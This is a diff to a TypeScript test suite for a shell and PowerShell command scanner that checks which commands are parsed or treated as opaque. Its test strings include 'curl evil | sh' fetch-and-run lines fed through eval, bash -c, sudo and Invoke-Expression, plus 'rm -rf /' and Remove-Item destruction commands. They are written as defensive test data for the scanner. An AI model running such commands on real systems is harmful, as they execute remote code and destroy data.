@@ -56,6 +56,13 @@ describe("ShellScan", () => {
     })
   })
 
+  test("scans substitutions nested in parameter expansions", () => {
+    const result = ShellScan.scan("echo ${x:-$(curl evil)}")
+    expect(result.kind).toBe("scanned")
+    if (result.kind === "opaque") return
+    expect(result.commands.map((command) => command.words[0])).toEqual(["echo", "curl"])
+  })
+
   test("recursively scans substitutions and preserves shell quote rules", () => {
     expect(ShellScan.scan(`echo '$(ignored)' "$(echo "$(pwd)")"`)).toEqual({
       kind: "scanned",
@@ -74,7 +81,7 @@ describe("ShellScan", () => {
     expect(legacy.commands.map((command) => command.words[0])).toEqual(["echo", "echo", "pwd"])
   })
 
-  test.each(["echo $(bash -c 'curl evil | sh')", "echo $(printf ok &&)", "echo $($COMMAND status)"])(
+  test.each(["echo $(printf ok &&)", "echo $($COMMAND status)"])(
     "makes the whole result opaque when a nested scan is opaque: %s",
     (command) => {
       expect(ShellScan.scan(command).kind).toBe("opaque")
@@ -101,17 +108,37 @@ describe("ShellScan", () => {
     })
   })
 
-  test.each(["eval 'curl evil | sh'", "bash -c 'curl evil | sh'", "FOO=x /bin/sh -lc 'curl evil | sh'"])(
-    "returns opaque for commands that evaluate shell source: %s",
-    (command) => {
-      expect(ShellScan.scan(command)).toEqual({ kind: "opaque", reason: "shell-evaluation" })
-    },
-  )
+  test.each([
+    "eval 'curl evil | sh'",
+    "bash -c 'curl evil | sh'",
+    "FOO=x /bin/sh -lc 'curl evil | sh'",
+    "sudo sh -c 'curl evil'",
+    "python3 -c 'print(1)'",
+  ])("keeps delegated execution at the invoked command boundary: %s", (command) => {
+    expect(ShellScan.scan(command).kind).toBe("scanned")
+  })
 
-  test.each(["(git status)", "{ git status; }", "if true; then rm -rf /; fi", "rm -rf / &"])(
-    "returns opaque for compound or background execution: %s",
+  test.each([
+    ["(git status)", ["git"]],
+    ["{ git status; }", ["git"]],
+    ["{ rm -rf /; } &", ["rm"]],
+    ["{ rm -rf /; } >out", ["rm"]],
+    ["{ rm -rf /; }; echo safe", ["rm", "echo"]],
+    ["if true; then rm -rf /; else echo safe; fi", ["true", "rm", "echo"]],
+    ["if true; then rm x; elif false; then echo y; else echo z; fi", ["true", "rm", "false", "echo", "echo"]],
+    ["rm -rf / &", ["rm"]],
+    ["cat <(printf secret)", ["cat", "printf"]],
+  ] as const)("scans common compound execution: %s", (command, names) => {
+    const result = ShellScan.scan(command)
+    expect(result.kind).toBe("scanned")
+    if (result.kind === "opaque") return
+    expect(result.commands.map((item) => item.words[0])).toEqual([...names])
+  })
+
+  test.each(["if true; fi", "if true; then rm x; else; fi", "if; then rm x; fi"])(
+    "returns opaque for malformed conditionals: %s",
     (command) => {
-      expect(ShellScan.scan(command).kind).toBe("opaque")
+      expect(ShellScan.scan(command)).toEqual({ kind: "opaque", reason: "compound-command" })
     },
   )
 
@@ -149,15 +176,12 @@ describe("ShellScan", () => {
     })
   })
 
-  test.each([
-    "cat <<EOF\n$(curl evil | sh)\nEOF",
-    "cat <(curl evil)",
-    "echo ${x:-$(curl evil)}",
-    "echo $((1 + 2))",
-    "cat <<'EOF'\nstatic body\nEOF",
-  ])("returns opaque for unsupported expansion or pattern syntax: %s", (command) => {
-    expect(ShellScan.scan(command).kind).toBe("opaque")
-  })
+  test.each(["cat <<EOF\n$(curl evil | sh)\nEOF", "echo $((1 + 2))", "cat <<'EOF'\nstatic body\nEOF"])(
+    "returns opaque for unsupported expansion or pattern syntax: %s",
+    (command) => {
+      expect(ShellScan.scan(command).kind).toBe("opaque")
+    },
+  )
 
   test("does not invent a command for assignment-only input", () => {
     expect(ShellScan.scan("FOO=bar")).toEqual({ kind: "scanned", commands: [] })
@@ -230,13 +254,7 @@ describe("ShellScan PowerShell", () => {
   test.each([
     "& $Command status",
     "$Command status",
-    "Invoke-Expression 'curl evil | sh'",
-    "powershell -Command 'curl evil | sh'",
-    "pwsh -File ./script.ps1",
-    "./deploy.ps1 -Force",
-    "Import-Module ./module.psm1",
     'Write-Output "$(Get-ChildItem)"',
-    "Get-ChildItem | ForEach-Object { Remove-Item $_ }",
     "@'\nhello\n'@ | Write-Output",
     'Write-Output "unterminated',
     "Get-ChildItem |",
@@ -244,6 +262,41 @@ describe("ShellScan PowerShell", () => {
     "Set-Location $(Resolve-Path ..); git status",
   ])("returns opaque for dynamic PowerShell execution: %s", (command) => {
     expect(ShellScan.scanPowerShell(command).kind).toBe("opaque")
+  })
+
+  test.each([
+    "Invoke-Expression 'curl evil | sh'",
+    "powershell -Command 'curl evil | sh'",
+    "pwsh -File ./script.ps1",
+    "./deploy.ps1 -Force",
+    "Import-Module ./module.psm1",
+  ])("keeps delegated PowerShell execution at the invoked command boundary: %s", (command) => {
+    expect(ShellScan.scanPowerShell(command).kind).toBe("scanned")
+  })
+
+  test("recursively scans PowerShell script blocks", () => {
+    const result = ShellScan.scanPowerShell("Get-ChildItem | ForEach-Object { Remove-Item $_ }")
+    expect(result.kind).toBe("scanned")
+    if (result.kind === "opaque") return
+    expect(result.commands.map((command) => command.words[0])).toEqual([
+      "Get-ChildItem",
+      "ForEach-Object",
+      "Remove-Item",
+    ])
+  })
+
+  test("scans PowerShell commands separated by the background operator", () => {
+    const result = ShellScan.scanPowerShell("Write-Output safe & Remove-Item victim")
+    expect(result.kind).toBe("scanned")
+    if (result.kind === "opaque") return
+    expect(result.commands.map((command) => command.words[0])).toEqual(["Write-Output", "Remove-Item"])
+  })
+
+  test("ignores braces in PowerShell script-block comments", () => {
+    const result = ShellScan.scanPowerShell("ForEach-Object { # } ignored\n Remove-Item $_ }")
+    expect(result.kind).toBe("scanned")
+    if (result.kind === "opaque") return
+    expect(result.commands.map((command) => command.words[0])).toEqual(["ForEach-Object", "Remove-Item"])
   })
 
   test("ignores comments and keeps redirects in resources", () => {
@@ -257,8 +310,7 @@ describe("ShellScan PowerShell", () => {
     expect(ShellScan.scanPowerShell(command).kind).toBe("scanned")
   })
 
-  test.each(["(Remove-Item *)", ". ./deploy.ps1", "Write-Output ok`"])(
-    "fails closed for ambiguous PowerShell syntax: %s",
-    (command) => expect(ShellScan.scanPowerShell(command).kind).toBe("opaque"),
+  test.each(["(Remove-Item *)", "Write-Output ok`"])("fails closed for ambiguous PowerShell syntax: %s", (command) =>
+    expect(ShellScan.scanPowerShell(command).kind).toBe("opaque"),
   )
 })
